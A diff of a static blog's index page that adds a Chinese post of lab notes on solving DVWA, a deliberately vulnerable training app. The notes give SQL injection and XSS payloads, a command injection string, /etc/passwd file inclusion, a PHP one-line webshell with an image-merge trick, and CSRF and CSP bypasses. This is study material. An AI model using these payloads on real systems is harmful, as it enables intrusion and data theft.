@@ -157,7 +157,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-count">11</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -205,6 +205,276 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://c4ooc0.github.io/2022/06/13/DVWA%20%E6%94%BB%E7%95%A5%E7%BB%8F%E5%8E%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/images.jpg">
+      <meta itemprop="name" content="c4ooc0">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="c4ooc0个人博客">
+      <meta itemprop="description" content="永怀谦卑与求知欲">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | c4ooc0个人博客">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/06/13/DVWA%20%E6%94%BB%E7%95%A5%E7%BB%8F%E5%8E%86/" class="post-title-link" itemprop="url">DVWA 攻略经历</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-06-13 10:50:31" itemprop="dateCreated datePublished" datetime="2022-06-13T10:50:31+08:00">2022-06-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-11-17 10:46:24" itemprop="dateModified" datetime="2022-11-17T10:46:24+08:00">2022-11-17</time>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>3.4k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>12 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <blockquote>
+<p>竟然写完了
+部署到云服务器上了</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u014029795/article/details/100006641">DVWA 攻略</a>写的很好了，这里仅作一些知识点备忘录</p>
+<h1 id="brute-force"><a class="markdownIt-Anchor" href="#brute-force"></a> Brute Force</h1>
+<p>可以通过 php 代码发现，用户名没有做任何过滤，但密码取 md5，之后就是 sql 语句了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Get username</span></span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get password</span></span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line"><span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );</span><br></pre></td></tr></table></figure>
+<ul>
+<li>爆破，根据 echo 可以看出攻击者不能区分用户名错还是密码错，于是用户名和密码需要组合爆破</li>
+<li>因为用户名没有做任何过滤，可以使用 sql 注入<code>admin’ or '1′='1</code></li>
+</ul>
+<p>BurpSuite 爆破步骤</p>
+<blockquote>
+<p>用 Java 命令运行 bp 的 jar 包，获得更大的 jvm 内存
+java17+burpsuitecommunity2022 运行命令：
+<code>java -Xmx2048M --add-opens=java.desktop/javax.swing=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED -jar BP路径\burpsuite_community.jar </code>
+使用批处理文件实现，遇到 jar 路径有空格，命令报错，解决方法：整个路径加双引号</p>
+</blockquote>
+<ol>
+<li>服务器设置代理，BP 拦截，抓到登录点 login 发出的包</li>
+<li>发送到 Intruder 模块来进行爆破，在 Position 中的 Attack type 选择 cluster boomb，清除其它的爆破项，选择用户名和密码两个字段进行爆破</li>
+<li>在 Payloads 中为两个字段设置字典，新版 BP 在选择 resource pool 下面有个 create new source pool 可以重新设置线程数，勾选 maximum concurrent <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=requests&amp;spm=1001.2101.3001.7020">requests</a>，并且进行参数的设置，Attack 开始</li>
+<li>看到 length 有变，基本就差不错了</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Sanitise username input</span></span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"><span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitise password input</span></span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line"><span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"><span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>Medium 级别的代码主要增加了 mysql_real_escape_string 函数，这个函数会对字符串中的特殊符号（x00，n，r，，’，”，x1a）进行转义，基本上能够抵御 sql 注入攻击(宽字节注入可以搞定)，但是，依然没有加入有效的防爆破机制</p>
+<h1 id="command-injection"><a class="markdownIt-Anchor" href="#command-injection"></a> Command Injection</h1>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// Windows</span></span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// *nix</span></span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>前端输入一个 ip 地址，后端 ping，因为没有做过滤，ip 地址后面跟&amp;命令即可
+<code>127.0.0.1&amp;whoami</code></p>
+<ul>
+<li>字符过滤</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://linux.cn/article-2469-1.html#:~:text=Linux%E4%B8%AD%E5%91%BD%E4%BB%A4%E9%93%BE%E6%8E%A5%E6%93%8D%E4%BD%9C%E7%AC%A6%E7%9A%84%E5%8D%81%E4%B8%AA%E6%9C%80%E4%BD%B3%E5%AE%9E%E4%BE%8B%201%20%E5%92%8C%E5%8F%B7%E6%93%8D%E4%BD%9C%E7%AC%A6%20%28%26%29%202%20%E5%88%86%E5%8F%B7%E6%93%8D%E4%BD%9C%E7%AC%A6%20%28%3B%29%203,%E4%BC%98%E5%85%88%E6%93%8D%E4%BD%9C%E7%AC%A6%20%28%29%20Command_x1%20%26%26Comma%20...%2010%20%E8%BF%9E%E6%8E%A5%E7%AC%A6%20%28%5C%29">Linux 中命令链接操作符</a>
+例如 medium 过滤了&quot;&amp;&amp;” 、”;”,用别的字符代替就好，例如“&amp;”“|”等。
+hard 过滤表：
+'&amp;' =&gt; '',
+';' =&gt; '',
+'| ' =&gt; '',
+'-' =&gt; '',
+'$' =&gt; '',
+'(' =&gt; '',
+')' =&gt; '',
+'`' =&gt; '',
+'||' =&gt; '',
+|后有个空格，不加空格就行</p>
+<h1 id="csrf"><a class="markdownIt-Anchor" href="#csrf"></a> CSRF</h1>
+<p>CSRF，全称 Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。
+构造链接
+<a target="_blank" rel="noopener" href="http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#">http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#</a>
+有验证：
+<code> if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false )</code>
+stripos 检查 string 中是第一次出现 pattern 的位置（不区分大小写）</p>
+<h3 id="anti-csrf-token"><a class="markdownIt-Anchor" href="#anti-csrf-token"></a> Anti-csrf token</h3>
+<p>安装插件 CSRF Token Tracke</p>
+<h1 id="file-inclusion"><a class="markdownIt-Anchor" href="#file-inclusion"></a> File Inclusion</h1>
+<p><code>$file = $_GET[ 'page' ];</code>
+没有验证，直接改 page 参数：<code>?page=/etc/passwd</code></p>
+<h2 id="远程文件包含"><a class="markdownIt-Anchor" href="#远程文件包含"></a> 远程文件包含</h2>
+<p>当服务器的 php 配置中，选项 allow_url_fopen 与 allow_url_include 为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。使用下面的 url 来去访问另外一台设备上的文件。
+/dvwa/vulnerabilities/fi/?page=<a target="_blank" rel="noopener" href="http://192.168.181.203:8012">http://192.168.181.203:8012</a>
+<a target="_blank" rel="noopener" href="https://blog.csdn.net/u014029795/article/details/102781669">
+</a></p>
+<h2 id="过滤"><a class="markdownIt-Anchor" href="#过滤"></a> 过滤</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>( <span class="keyword">array</span>( <span class="string">&quot;http://&quot;</span>, <span class="string">&quot;https://&quot;</span> ), <span class="string">&quot;&quot;</span>, <span class="variable">$file</span> );</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>( <span class="keyword">array</span>( <span class="string">&quot;../&quot;</span>, <span class="string">&quot;..\&quot;&quot;</span> ), <span class="string">&quot;&quot;</span>, <span class="variable">$file</span> );</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>使用 str_replace 函数是极其不安全的，因为可以使用双写绕过替换规则。同时，因为替换的只是“…/”、“…\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的。
+/dvwa/vulnerabilities/fi/<code>?page=/etc/passwd</code> 依旧可以</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( !<span class="title function_ invoke__">fnmatch</span>( <span class="string">&quot;file*&quot;</span>, <span class="variable">$file</span> ) &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;include.php&quot;</span> )</span><br></pre></td></tr></table></figure>
+<p>开头必须是 file，可以用 file 协议绕过：<code>?page=file:///etc/passwd</code><a target="_blank" rel="noopener" href="https://linux.cn/article-2469-1.html#:~:text=Linux%E4%B8%AD%E5%91%BD%E4%BB%A4%E9%93%BE%E6%8E%A5%E6%93%8D%E4%BD%9C%E7%AC%A6%E7%9A%84%E5%8D%81%E4%B8%AA%E6%9C%80%E4%BD%B3%E5%AE%9E%E4%BE%8B%201%20%E5%92%8C%E5%8F%B7%E6%93%8D%E4%BD%9C%E7%AC%A6%20%28%26%29%202%20%E5%88%86%E5%8F%B7%E6%93%8D%E4%BD%9C%E7%AC%A6%20%28%3B%29%203,%E4%BC%98%E5%85%88%E6%93%8D%E4%BD%9C%E7%AC%A6%20%28%29%20Command_x1%20%26%26Comma%20...%2010%20%E8%BF%9E%E6%8E%A5%E7%AC%A6%20%28%5C%29">
+</a></p>
+<h1 id="文件上传"><a class="markdownIt-Anchor" href="#文件上传"></a> 文件上传</h1>
+<p>php 一句话木马：<code>&lt;?php @eval($_POST['shell'])?&gt;</code>
+上传成功后用蚁剑或者菜刀连接
+遇到几个小问题：</p>
+<ul>
+<li>蚁剑的使用方法：
+<ul>
+<li>url 处须填上传的文件所在地址</li>
+<li>密码处填单引号里的内容，以上文为例，填 shell</li>
+</ul>
+</li>
+<li>指定文件类型
+<ul>
+<li>bp 抓包，改文件内容处的 Content-Type</li>
+<li><code>copy 1.jpg/b + muma.php/a muma.jpg</code> - 参数/b 指定以二进制格式复制、合并文件; 用于图像类/声音类文件
+参数/a 指定以 ASCII 格式复制、合并文件。用于 txt 等文档类文件 - 需结合命令注入漏洞，把<code>muma.jpg</code>改成<code>muma.php</code></li>
+</ul>
+</li>
+</ul>
+<p>hard 难度仅在包里改文件后缀和 Content-Type 没用，还是得造图片马
+比较坑的是，在 powershell 里的 copy 命令总是报错，在 cmd 里正常运行，离谱离谱</p>
+<h1 id="insecure-captcha"><a class="markdownIt-Anchor" href="#insecure-captcha"></a> Insecure CAPTCHA</h1>
+<p>验证码的 key 没有正确配置，我这儿没显示，不过可以学一下绕过方法
+感觉这个主要是代码审计，easy 难度第一步验证 CAPTCHA（step=1），第二步（step=2）再修改密码，可以抓包修改 step 的值绕过；medium 难度，构造参数 passed_captcha=true 绕过；hard 差不多也是构造参数</p>
+<h1 id="sql-injection"><a class="markdownIt-Anchor" href="#sql-injection"></a> SQL Injection</h1>
+<p><a target="_blank" rel="noopener" href="https://baynk.blog.csdn.net/article/details/102793220">DVWA 之 SQL Injection</a>讲的挺好，就是赋值的时候的符号
+user(),database(),version()
+Surname: dvwa@localhost dvwa 8.0.29-0ubuntu0.20.04.3
+1’ and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_schema=‘dvwa’ and table_name=‘users’ #
+Surname: guestbook,users</p>
+<p>union select group_concat(user_id,first_name,last_name),group_concat(password)
+First name: 1adminadmin,2GordonBrown,3HackMe,4PabloPicasso,5BobSmith
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99,e99a18c428cb38d5f260853678922e03,8d3533d75ae2c3966d7e0d4fcc69216b,0d107d09f5bbe40cade3de5c71e9e9b7,5f4dcc3b5aa765d61d8327deb882cf99
+然后是这个样子的 sql 注入
+<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FvjR1z74mcTuTx4kxTSMng_F5rAX.png" alt="" />
+抓包改数据，然后发现’和“符号转义了，所以不可以直接写库名和表名了，需要将库名和表名转别的形式：
+<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FquVLoKKNKLKgpm-CVog2IKVukww.png" alt="" />
+构造的注入语句：
+1 and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_schema=concat(char(100),char(118),char(119),char(97)) and table_name=concat(char(117),char(115),char(101),char(114),char(115)) #
+<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fps-ZS5TbL5Nu3DVL-5vcnZ5LqHt.png" alt="" />
+High 级别的只是在 SQL 查询语句中添加了 LIMIT 1，加#注释掉就行了（刚开始随便试了一下，没想到直接成了）</p>
+<h1 id="sql-盲注"><a class="markdownIt-Anchor" href="#sql-盲注"></a> SQL 盲注</h1>
+<p><a target="_blank" rel="noopener" href="https://baynk.blog.csdn.net/article/details/102794083">SQL Injection(Blind)</a> 依旧写的很详细了，正常人用 sqlmap 吧</p>
+<h1 id="weak-session-ids"><a class="markdownIt-Anchor" href="#weak-session-ids"></a> Weak Session IDs</h1>
+<p>密码与证书等认证手段，一般仅仅用于登录（Login）的过程。当登陆完成后，用户访问网站的页面，不可能每次浏览器请求页面时都再使用密码认证一次。因此，当认证完成后。就需要替换一个对用户透明的凭证。这个凭证就是 SessionID。
+当用户登陆完成后，在服务器端就会创建一个新的会话（Session），会话中会保存用户的状态和相关信息。服务器端维护所有在线用户的 Session，此时的认证，只需要知道是哪个用户在浏览当前的页面即可。为了告诉服务器应该使用哪一个 Session，浏览器需要把当前用户持有的 SessionID 告知服务器。SessionID 一旦在生命周期内被窃取，就等同于账户失窃。同时由于 SessionID 是用户登录之后才持有的认证凭证，因此黑客不需要再攻击登陆过程（比如密码）。
+以前没见过这个漏洞，看了漏洞利用手段，感觉有点像密码学攻击的手段，SessionID 和密钥的定义差不多。
+看代码可以知道，easy 难度是 SessionID 从 0 开始累加、medium 难度将 SessionID 的值改成了当前的时间，hard 难度 MD5(i++,time)，缺少随机性。果然 impossible 难度用了随机数生成+sha1，随机性增强，破解难度大大提高。</p>
+<h1 id="xss"><a class="markdownIt-Anchor" href="#xss"></a> XSS</h1>
+<p>xss，看上去就是造个弹窗，看看定义：指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行。或许弹窗就是执行命令的方式？</p>
+<h2 id="dom-型-xss"><a class="markdownIt-Anchor" href="#dom-型-xss"></a> DOM 型 XSS</h2>
+<p>dom xss 的产生并没有和后台服务器产生交互，而是通过浏览器的 dom 树解析产生的。
+DOM（Document Object Model）即文档对象模型，一种处理 HTML 和 XML 文件的标准 API。以前一直没 get 到 dom 树是什么东西，自从自己写了个网页之后就顿悟，就是 HTML 的标签树。</p>
+<p>easy 后端 php 没代码，纯纯靠 js 验证，看看网页代码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;form name=<span class="string">&quot;XSS&quot;</span> method=<span class="string">&quot;GET&quot;</span>&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;default&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> lang = <span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">substring</span>(<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>)+<span class="number">8</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="string">&quot;&#x27;&gt;&quot;</span> + <span class="built_in">decodeURI</span>(lang) + <span class="string">&quot;&lt;/option&gt;&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;&#x27; disabled=&#x27;disabled&#x27;&gt;----&lt;/option&gt;&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;English&#x27;&gt;English&lt;/option&gt;&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;French&#x27;&gt;French&lt;/option&gt;&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;Spanish&#x27;&gt;Spanish&lt;/option&gt;&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;German&#x27;&gt;German&lt;/option&gt;&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Select&quot;</span> /&gt;</span></span></span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+<p>利用方法：在<code>/dvwa/vulnerabilities/xss_d/?default=English</code>中直接将 English 改为<code>&lt;script&gt;alert('xss')&lt;/script&gt;</code>，为什么修改参数会触发弹窗呢？
+大概是服务器把前端传过来的参数，过滤过滤在传回来吧</p>
+<blockquote>
+<p>根据恶意代码是否存储在服务器中，XSS 可以分为存储型的 XSS 与反射型的 XSS。DOM 型的 XSS 由于其特殊性，常常被分为第三种，这是一种基于 DOM 树的 XSS。例如服务器端经常使用 document.boby.innerHtml 等函数动态生成 html 页面，如果这些函数在引用某些变量时没有进行过滤或检查，就会产生 DOM 型的 XSS。DOM 型 XSS 可能是存储型，也有可能是反射型。</p>
+</blockquote>
+<p>原理差不多，过程不一样
+medium 后端有过滤：</p>
+<ol>
+<li>构造链接<code>/dvwa/vulnerabilities/xss_d/?#default=&lt;script&gt;alert('xss')&lt;/script&gt;</code>，#后面的东西不会发给服务器</li>
+<li>用 img 标签或其他标签的特性去执行 js 代码，比如 img 标签的 onerror 事件，构造连接</li>
+</ol>
+<p>之前用过 img 的方法，这次使用 svg 的方法来完成。
+<code>/dvwa/vulnerabilities/xss_d/?default=&lt;/option&gt;&lt;/select&gt;&lt;svg onload=alert(&quot;xss&quot;)&gt;</code>
+svg 意为可缩放矢量图形，在加载的时候弹窗
+hard 难度要求 default 的值必须为 select 选择菜单中的值，用#来绕过注入代码</p>
+<h2 id="反射性-xss"><a class="markdownIt-Anchor" href="#反射性-xss"></a> 反射性 xss</h2>
+<p>绕过方法：</p>
+<ol>
+<li>双写绕过
+输入<code>&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt;</code></li>
+<li>大小写混淆绕过
+输入<code>&lt;ScRipt&gt;alert(/xss/)&lt;/script&gt;</code></li>
+<li>通过 img、body 等标签的事件或者 iframe 等标签的 src 注入恶意的 js 代码。
+输入<code>&lt;img src=1 onerror=alert(/xss/)&gt;</code></li>
+</ol>
+<h2 id="存储型-xss"><a class="markdownIt-Anchor" href="#存储型-xss"></a> 存储型 XSS</h2>
+<p>绕过方法一样，利用过程不同：存储型 xss 将用户构造的有害输入直接存储起来，不需要攻击者构造链接诱使受害人点击触发，而是目标网站的用户只要访问插入恶意代码的网站就能触发。
+多见于留言板</p>
+<h1 id="content-security-policy-csp-bypass"><a class="markdownIt-Anchor" href="#content-security-policy-csp-bypass"></a> Content Security Policy (CSP) Bypass</h1>
+<p>CSP 指的是内容安全检测，又称网页安全政策，CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。</p>
+<p>首先可以 F12-&gt;网络-&gt;发送一个请求，可以看到请求头的限制，然后根据提供的地址尝试有没有包含成功，再者构造自己的地址看看能不能成功
+<a target="_blank" rel="noopener" href="https://baynk.blog.csdn.net/article/details/103157671">CSP 攻略</a>中直接给服务器上传了一个 xss 代码文件（引入外部 js），我试了一下蚁剑，发现不太行，然后也是直接 xftp 传了一个过去</p>
+<p>meduim 难度发现<code>unsafe-inline</code>参数，然后有<code>nonce</code>，作用在<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30762087/article/details/96272416?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1-96272416-blog-88739948.pc_relevant_downloadblacklistv1&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1-96272416-blog-88739948.pc_relevant_downloadblacklistv1&amp;utm_relevant_index=2">这里</a>有提到</p>
+<ul>
+<li>nonce-&lt;base64 值&gt;：</li>
+</ul>
+<p>特定使用一次性加密内联脚本的白名单。服务器必须在每一次传输政策时生成唯一的一次性值。否则将存在绕过资源政策的可能。
+但是这题 php 代码中把 nonce 写死，于是就可以利用这个 nonce 进行 XSS（内联 JavaScript 代码）
+hard 难度：
+请求网址:
+<code>http://121.37.194.38/dvwa/vulnerabilities/csp/source/jsonp.php?callback=solveSum</code>
+这个 callback 参数是不是调用一个函数，看<a target="_blank" rel="noopener" href="https://baynk.blog.csdn.net/article/details/103157671">CSP 攻略</a>的意思大概是这个？抓包修改这个参数，弹窗成功</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">clickButton</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> s = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">  s.<span class="property">src</span> = <span class="string">&quot;source/jsonp.php?callback=solveSum&quot;</span>;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>大概意思是新建一个 script 标签（HTML 元素），指定这个标签 src 的属性，然后追加该标签
+按理说不至于啊，这都没有给他接受 callback 参数的机会，然后<a target="_blank" rel="noopener" href="https://www.cnblogs.com/linfangnan/p/13714694.html">这里</a>提到 jsonp.php 获取 callback 参数后没有做任何过滤，拿源码一看，果然！</p>
